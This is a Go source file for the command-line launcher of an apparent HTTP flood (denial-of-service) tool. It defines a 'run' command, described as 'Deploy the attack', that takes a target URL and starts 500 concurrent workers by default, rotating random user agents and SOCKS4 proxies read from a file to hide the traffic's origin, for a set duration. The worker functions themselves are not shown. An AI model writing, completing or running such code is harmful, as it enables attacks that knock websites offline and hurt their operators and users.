package main

import (
	"fmt"
	"net/url"
	"time"

	"github.com/mkideal/cli"
)

type runT struct {
	cli.Helper
	Url      string `cli:"*url"`
	Worker   int    `cli:"w,workers" dft:"500"`
	File     string `cli:"f,file" dft:"socks4.txt"`
	Duration int    `cli:"d,duration" dft:"10"`
}

var attackCommand = &cli.Command{
	Name: "run",
	Desc: "Deploy the attack",
	Argv: func() interface{} {
		return new(runT)
	},
	Fn: func(ctx *cli.Context) error {
		argv := ctx.Argv().(*runT)
		useragents := getUserAgents(500)
		proxies := readLines(argv.File)
		u, err := url.ParseRequestURI(argv.Url)

		if err != nil {
			return err
		}

		fmt.Println("[+] Starting attack...")

		for i := 0; i < argv.Worker; i++ {
			go worker(u, useragents, proxies)
		}

		time.Sleep(time.Duration(argv.Duration) * time.Second)

		fmt.Println("[+] Attack finished")

		return nil
	},
}
